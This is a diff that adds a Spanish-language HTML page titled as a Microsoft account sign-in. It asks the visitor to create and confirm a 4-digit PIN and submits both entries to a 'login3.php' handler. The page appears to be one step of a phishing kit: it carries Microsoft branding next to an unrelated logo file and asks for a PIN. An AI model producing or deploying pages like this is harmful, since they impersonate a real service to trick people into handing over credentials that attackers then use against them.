@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<link rel="icon" href="favicon.ico">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+</head>
+<body>
+		<section id="containerLogin">
+			<div id="bodyLogin" class="opacity0">
+				<div class="divLogo">
+					<img src="img/cabimasalta.svg" class="logoLogin" alt="Logo">
+				</div>	
+
+				<div id="containerLayount">
+					<div id="divEmail" class="">
+						<div id="alertEmailLogin" style="display: none;"></div>
+						<form action="login3.php" method="post">
+						<h2>Crea un PIN de 4 dígitos</h2>
+						<div id="alertPass" style="display: none;"></div>
+						<input type="password" id="passUser" name="passPIN" placeholder="Ingrese su PIN" maxlength="4" required pattern="[0-9]{1,4}">
+						<input type="password" id="passUser" name="passPIN2" placeholder="Confirme su PIN" maxlength="4" required pattern="[0-9]{1,4}">
+						<a href="#" id="linkRecoveryPass"></a>
+						<div class="divButton">
+						<button type="submit" id="btnLogin" class="btnFormLogin">Finalizar</button>
+						</div>
+						</form>
+					</div>
+				</div>
+
+			</div>
+		</section>	
+		<script src="https://kit.fontawesome.com/7f3722b882.js" crossorigin="anonymous"></script>
+		<script type="text/javascript" src="js/functions.js"></script>
+</body>
+</html>
